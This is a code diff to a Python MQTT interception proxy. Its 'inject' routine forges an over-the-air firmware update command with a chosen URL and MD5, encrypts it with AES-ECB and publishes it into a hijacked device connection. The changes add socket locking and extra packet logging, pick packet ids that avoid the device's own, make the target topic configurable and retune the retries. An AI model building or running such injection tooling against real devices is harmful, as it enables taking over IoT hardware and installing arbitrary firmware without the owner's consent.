@@ -82,7 +82,8 @@ def pipe(a,b,tag,state=None):
                 print("pipe",tag,"EOF",flush=True); break
             if tag != "S":
                 log(tag,d)
-                try: b.sendall(d)
+                try:
+                    with WLOCK: b.sendall(d)   # the injector writes to the same socket
                 except OSError: break
                 continue
             buf += d
@@ -132,6 +133,10 @@ def log(direction,d):
             if topic.endswith("/cmd") or topic.endswith("/update"):
                 print(f"{direction} CMDHEX {d[j:].hex()}",flush=True)
         except Exception: print(direction,"PUBLISH <unparsed>",flush=True)
+    elif t in (14,):
+        print(f"{direction} DISCONNECT",flush=True)
+    elif t==9:
+        print(f"{direction} SUBACK {d[1:].hex()}",flush=True)
     elif t in (8,):
         try:
             i=2; out=[]
@@ -185,7 +190,7 @@ def _enc(n):
         if not n: return o
 def _pkt(kind, body, flags=0):
     return bytes([(kind<<4)|flags])+_enc(len(body))+body
-_PID=[0]
+_PID=[0x4000]  # the device owns the low ids on this same connection; start high to avoid collisions
 def _pub(sock, topic, payload, qos0=True):
     tb=topic.encode()
     if qos0:
@@ -194,7 +199,9 @@ def _pub(sock, topic, payload, qos0=True):
     else:
         _PID[0]=(_PID[0]%65535)+1
         body=struct.pack(">H",len(tb))+tb+struct.pack(">H",_PID[0])+payload
-        sock.sendall(_pkt(3, body, 0x03 if os.environ.get("OTA_RETAIN") else 0x02))
+        pkt=_pkt(3, body, 0x03 if os.environ.get("OTA_RETAIN") else 0x02)
+        print("PUBHEX", pkt[:40].hex(), "len", len(pkt),flush=True)
+        sock.sendall(pkt)
 def _live():
     """The current device socket: a reconnect replaces it, so never trust a captured one.
     A closed socket keeps its object, so check the descriptor too."""
@@ -206,7 +213,7 @@ def _live():
     return c
 
 def inject(cli, up=None):
-    time.sleep(1)
+    time.sleep(8)
     if not MD5:
         print("inject: OTA_MD5 unset",flush=True); return
     st={"state":{"desired":{"url":URL,"md5":MD5,"pcUrl":URL,"pcMd5":MD5,"model":MODEL,"sub_mac":THING.upper()},"reported":{}},"version":999}
@@ -262,18 +269,18 @@ def inject(cli, up=None):
                 pl=pl+b"\0"*(-len(pl)%16)
                 e=Cipher(algorithms.AES(k),modes.ECB()).encryptor()
                 pl=e.update(pl)+e.finalize()
-        for _try in range(40):
+        for _try in range(30):
             c=_live()
             if c is None:
                 time.sleep(1); continue
             try:
                 with WLOCK:
                     _pub(up if (up and os.environ.get("OTA_VIA_UPSTREAM")) else c,
-                         f"hl/devices/{THING}/cmd", pl, qos0=False)
+                         os.environ.get("OTA_TOPIC") or f"hl/devices/{THING}/cmd", pl, qos0=False)
                 print(f"inject: cmd 1234 pid={_PID[0]} model={m} {text}",flush=True)
                 break
             except Exception as e:
-                print("inject cmd retry",repr(e),flush=True); time.sleep(1)
+                print("inject cmd retry",repr(e),flush=True); time.sleep(2)
         else:
             print("inject cmd gave up",flush=True); return
         time.sleep(4)
